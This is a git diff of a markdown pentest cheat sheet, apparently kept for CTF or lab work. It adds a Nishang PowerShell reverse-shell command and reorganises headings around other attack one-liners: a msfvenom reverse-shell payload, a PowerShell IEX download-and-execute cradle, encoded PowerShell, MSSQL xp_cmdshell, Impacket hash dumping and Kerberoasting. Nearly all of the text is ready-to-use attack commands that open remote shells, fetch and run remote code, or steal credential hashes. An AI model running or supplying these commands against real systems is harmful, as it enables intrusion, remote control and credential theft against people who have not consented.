@@ -66,10 +66,15 @@ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.0.1 LPORT=4444 -f elf >rever
 ```
 > linux
 
+## Nishang 
+```
+import-module Invoke-PowerShellTcp.ps1
+Invoke-PowerShellTcp -Reverse -IPAddress {LHOST} -Port 4444
+```
 
-## Powershell 
+# Powershell 
 
-# Downloading files
+## Downloading files
 ```
 powershell.exe IEX (New-Object Net.WebClient).DownloadString("{IP/website url}")
 ```
@@ -89,7 +94,7 @@ powershell.exe -e
 > e.g. powershell.exe -e (encoded stuff)
 
 
-# check OS version
+## check OS version
 ```
 [Environment]::Is64BitProcess
 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
@@ -105,21 +110,21 @@ EXEC xp+cmdshell '{command}'
 > summons interactive shell / cmd for MSSQL
 
 
-## Impacket
+# Impacket
 
-# Hash dump
+## Hash dump
 ```
 secretsdump.py '{username}@{IP}'
 ```
 > hash dump 
 
-# Kerberoasting + hash via SPN
+## Kerberoasting + hash via SPN
 ```
 GetUserSPNs.py -request -{NETBIOSNAME}-ip {IP} {DOMAIN}/{NAME}:{PASSWORD}
 ```
-> hash dump via keberoasting 
+> hash dump via keberoasting using SPN
 
-# MS sql logon 
+## MS sql logon 
 ```
 mssqlclient.py {username}@{IP}
 ```
